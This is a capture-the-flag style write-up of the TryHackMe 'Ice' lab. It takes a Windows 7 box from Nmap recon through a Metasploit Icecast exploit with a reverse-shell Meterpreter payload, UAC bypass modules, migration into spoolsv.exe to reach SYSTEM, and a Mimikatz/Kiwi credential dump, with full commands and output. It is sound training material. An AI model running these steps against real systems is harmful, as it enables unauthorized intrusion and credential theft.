About the Lab

TryHackMe is a browser-based platform for learning offensive and defensive security inside isolated, disposable virtual machines. Every machine in this write-up lived inside TryHackMe's own network and was intentionally built to be broken into — nothing here was run against a system I didn't have explicit permission to attack.

The Ice room is a Windows 7 box built around a single idea: get a foothold through a vulnerable service, then fight your way from a low-privilege user up to NT AUTHORITY\SYSTEM. It's a good room precisely because the privilege escalation doesn't go smoothly on the first try — the box is x64, but the easiest tools default to x86, and that mismatch is the whole lesson.

Skills covered: network reconnaissance, exploiting a known Metasploit module, enumerating a freshly popped Windows host, diagnosing a failed exploit from its error message, bypassing User Account Control (UAC), migrating between processes, and pulling credentials out of memory with Mimikatz.

Tools used

  • Parrot OSAttacker machine — a Linux distribution built for security work.
  • NmapNetwork scanner used to find open ports and running services.
  • Metasploit FrameworkExploitation framework used to weaponize known vulnerabilities and manage sessions.

The Walkthrough

Eleven phases, in the order they actually happened — including the two exploit attempts that failed before the privilege escalation worked.

Jump to phase: 1. Recon2. Initial Access3. Enumeration 4. LPE Recon5. Troubleshooting6. Verifying 7. Migration8. Kiwi

Before touching anything, the goal is simple: find out what's actually running on the box. Four scan types do that job here —

  • SYN scan (-sS) — sends a half-open connection to each port. Fast and relatively quiet, the default scan for most engagements.
  • TCP connect scan (-sT) — completes the full three-way handshake. Slower, but doesn't need raw-socket privileges and works where SYN scans are blocked.
  • Service/version detection (-sV) and default scripts (-sC) — once a port is known to be open, these figure out exactly what software is listening and run safe, informational probes against it.
  • OS detection (-O) — fingerprints the TCP/IP stack to guess the operating system.

Challenge encountered: a full nmap -sV -sC -O -p- TARGET_IP scan was attempted twice but never finished in a reasonable window — scanning all 65,535 ports with scripts and OS detection on a lab VM can simply take a long time. Rather than wait it out, the scan was narrowed to the two ports that actually mattered (8000 and 3389), which is a perfectly normal real-world trade-off: scan broad first, then scan deep on what matters.

Why it matters: the RDP NTLM info script didn't need a login to leak the hostname (DARK-PC) and the Windows build (6.1.7601, i.e. Windows 7 SP1) directly from the TLS handshake metadata — free intelligence before a single exploit is fired.

Result: two services of interest — Icecast on 8000, RDP on 3389 — against a Windows 7 SP1 (build 7601) host named DARK-PC.

Icecast is streaming-media server software. Version detection flagged it on port 8000, and Metasploit happens to ship a matching exploit for an old header-overflow bug in that exact service.

Metasploit is a framework for finding, configuring, and firing known exploits without writing the low-level shellcode by hand. A reverse TCP payload tells the target to connect back out to the attacker, which sidesteps inbound firewall rules. Once that payload lands, it unpacks into a Meterpreter session — an in-memory agent that gives interactive control of the target without ever touching disk as a traditional executable.

msfconsole
msf > search icecast
0  exploit/windows/http/icecast_header  2004-09-28  great  Icecast Header Overwrite

msf > use exploit/windows/http/icecast_header
msf exploit(windows/http/icecast_header) > set RHOSTS TARGET_IP
msf exploit(windows/http/icecast_header) > set LHOST VPN_IP
msf exploit(windows/http/icecast_header) > exploit
[*] Started reverse TCP handler on VPN_IP:4444
[*] Sending stage (203455 bytes) to TARGET_IP
[*] Meterpreter session 1 opened (VPN_IP:4444 -> TARGET_IP:49234)

Why LHOST matters: LHOST is the address the target will call back to once exploited. Get it wrong (point it at the wrong interface, or forget the VPN tunnel address TryHackMe assigns) and the handler sits there forever waiting for a connection that can never arrive.

Result: Meterpreter session 1, running as Dark-PC\Dark — a real foothold, but just a standard user, not an administrator.

Two quick commands to orient inside the new session:

meterpreter
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
Domain          : WORKGROUP
Meterpreter     : x86/windows

meterpreter > getuid
Server username: Dark-PC\Dark
The detail that drives the rest of this walkthrough: the operating system is x64, but the Meterpreter process that landed is x86. Icecast itself is a 32-bit application, so the shellcode that rode in through it is 32-bit too — even though it's sitting on a 64-bit OS. Mixing those up is exactly what caused the failures in Phase 5.

A foothold as a standard user doesn't mean the box is "owned." Local privilege escalation is the process of turning that limited access into administrator or SYSTEM-level control — usually by abusing a misconfiguration, an unpatched bug, or a trusted process that runs with higher rights than the user who triggers it.

Metasploit's local exploit suggester automates the first pass: it checks the target's patch level and configuration against its library of known local exploits and reports which ones look applicable.

meterpreter
meterpreter > run post/multi/recon/local_exploit_suggester
[+] exploit/windows/local/bypassuac_comhijack: appears vulnerable
[+] exploit/windows/local/bypassuac_eventvwr: appears vulnerable
[+] exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: could not be validated
[+] exploit/windows/local/ms13_081_track_popup_menu: appears vulnerable
[+] exploit/windows/local/tokenmagic: appears vulnerable
 ...(13 candidate exploits in total)

Why validation still matters: "appears vulnerable" is a heuristic, not a guarantee — the module checks version numbers and config flags, not whether the exploit will actually pop a session on this specific build. The first module tried from this list, bypassuac_comhijack, is a perfect example of why.

This is the part of the lab that actually teaches something. The suggester's top pick was tried first:

msfconsole
msf > use exploit/windows/local/bypassuac_comhijack
msf exploit(...) > set SESSION 1
msf exploit(...) > set LHOST VPN_IP
msf exploit(...) > run
[+] The target appears to be vulnerable.
[-] Exploit aborted due to failure: bad-config: x86 payload selected for x64 system
[*] Exploit completed, but no session was created.
Challenge: the error says exactly what Phase 3 warned about. The module defaulted to an x86 payload because the current Meterpreter session is x86, but bypassuac_comhijack needs its payload architecture to match the operating system (x64), not the session that's calling it.

Rather than guess, the fix is to read the module's own documentation and see what it actually expects:

msfconsole
msf exploit(...) > info exploit/windows/local/bypassuac_comhijack
This module requires the architecture of the payload to match the OS,
but the current low-privilege Meterpreter session architecture can be different.

msf exploit(...) > show payloads
... 241  payload/windows/x64/meterpreter/reverse_tcp  normal  No ...

msf exploit(...) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(...) > run
[+] Part of Administrators group! Continuing...
[+] BypassUAC can bypass this setting, continuing...
[*] Uploading payload to C:\Users\Dark\AppData\Local\Temp\...dll
[*] Executing high integrity process C:\Windows\System32\mmc.exe
[*] Exploit completed, but no session was created.
Challenge (continued): forcing the x64 payload fixed the architecture error, but the exploit still didn't hand back a session. bypassuac_comhijack is confirmed here to not have succeeded on this box — it ran, uploaded a DLL, and executed a high-integrity process, but no stage ever called back. This result is reported honestly rather than claimed as a win.

With the first UAC bypass a dead end, the suggester's second candidate was tried instead:

msfconsole
msf > use exploit/windows/local/bypassuac_eventvwr
msf exploit(...) > set SESSION 1
msf exploit(...) > set LHOST VPN_IP
msf exploit(...) > run
[+] Part of Administrators group! Continuing...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds...
[*] Sending stage (203455 bytes) to TARGET_IP
[*] Meterpreter session 2 opened

This one worked on the first run — because eventvwr.exe is launched through SysWOW64, the 32-bit compatibility layer, the module's default x86 payload was already the correct architecture. No manual payload override needed.

Result: a second Meterpreter session, elevated via UAC bypass. The original session 1 is left running in the background the whole time — Metasploit doesn't close old sessions automatically.

A successful exploit opens a brand-new session rather than upgrading the old one in place, so both now exist side by side:

msfconsole
msf > sessions
Id  Type                     Information
1   meterpreter x86/windows  Dark-PC\Dark @ DARK-PC
2   meterpreter x86/windows  Dark-PC\Dark @ DARK-PC

msf > sessions -i 2
meterpreter > getprivs
SeDebugPrivilege
SeImpersonatePrivilege
SeBackupPrivilege
SeRestorePrivilege
 ...(23 privileges enabled)

Administrator vs. SYSTEM: UAC bypass elevates the process to a high-integrity administrator token — a real privilege jump, but still bounded by the Administrators group. NT AUTHORITY\SYSTEM is a level above that: the account the operating system itself runs as, with no restrictions a normal admin account has. Session 2's new privileges (like SeDebugPrivilege) are exactly what's needed to take that next step.

Every running program on Windows is a numbered process (PID), owned by some account, running at some privilege level, compiled for some architecture. Listing them shows exactly who owns what:

meterpreter
meterpreter > ps
PID   Name            Arch  User
704   lsass.exe       x64   NT AUTHORITY\SYSTEM
1272  spoolsv.exe     x64   NT AUTHORITY\SYSTEM
2612  TrustedInstaller.exe x64  NT AUTHORITY\SYSTEM
3652  powershell.exe  x86   Dark-PC\Dark

Process migration moves the Meterpreter agent out of the process it currently lives in and into a different one, inheriting that process's owner and privilege level. lsass.exe (Local Security Authority Subsystem) is the classic target because it holds credential material in memory — but migrating straight into it is risky and the lab specifically calls for something safer with matching architecture and privilege: the Print Spooler service, spoolsv.exe, which runs as SYSTEM, is x64 like the OS, and is stable enough to migrate into without crashing the session.

meterpreter
meterpreter > migrate -N spoolsv.exe
[*] Migrating from 3652 to 1272...
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
Result: full SYSTEM privileges, obtained by riding into a process that already had them rather than exploiting anything further.

Mimikatz is a well-known Windows post-exploitation tool that can pull plaintext passwords, hashes, and Kerberos tickets straight out of a running process's memory — most famously LSASS. In authorized assessments, it's used to show exactly how far a single compromised credential can travel across a network, which is what drives real-world patching priorities. Kiwi is the Meterpreter extension that ships Mimikatz's functionality as native Meterpreter commands.

meterpreter
meterpreter > load kiwi
Loading extension kiwi...
  mimikatz 2.2.0 (x64/windows)
Success.

meterpreter > help
Kiwi Commands
=============
creds_all       Retrieve all credentials (parsed)
creds_kerberos  Retrieve Kerberos creds (parsed)
creds_msv       Retrieve LM/NTLM creds (parsed)
dcsync          Retrieve user account info via DCSync

meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
(see spoiler below)

creds_all dumps every credential type Mimikatz knows how to read from memory in one pass — NTLM hashes, WDigest plaintext (if the box has it enabled), TsPkg, and Kerberos tickets — all in a single command.

⚠️ This credential belongs exclusively to a disposable TryHackMe training machine. It is not a real account, was never meant to be secret, and must never be reused anywhere.

Why this matters: credentials and hashes recovered this way are extremely sensitive in a real environment — an NTLM hash alone is often enough to authenticate elsewhere without ever cracking the plaintext ("pass the hash"). That's exactly why this page never prints them as plain, searchable text — they're base64-encoded in the page's data and only rendered after you deliberately click reveal.

  • Windows 7 SP1 (DARK-PC) environment enumerated

Lessons Learned

Recon first, always

Every useful fact in this lab — the service names, the hostname, the OS build — came from scanning before a single exploit was fired. Skipping recon means exploiting blind.

x86 vs x64 is not cosmetic

A session's own architecture and the target OS's architecture are two separate facts. Confusing them is the single most common reason a "should work" local exploit quietly fails.

Read the module before running it

info and show payloads turned a cryptic error into a clear fix. Documentation exists for a reason.

Troubleshoot systematically

When bypassuac_comhijack failed twice, the response was to change one variable (the payload architecture) at a time and re-test — not to guess randomly.

Processes carry identity

A process's architecture, owner, and privilege level all travel with it. Migrating into the right process is sometimes the entire privilege escalation.

SYSTEM is the real ceiling

Administrator still has a ceiling. SYSTEM does not — it's the account the OS itself trusts completely.

Exposed credentials travel far

A single reused password or hash can be the only thing standing between a single compromised box and an entire network.

Disabled controls widen the blast radius

UAC, patch levels, and service hardening all exist to add friction. Every one that's missing or outdated is one less thing an attacker has to work around.
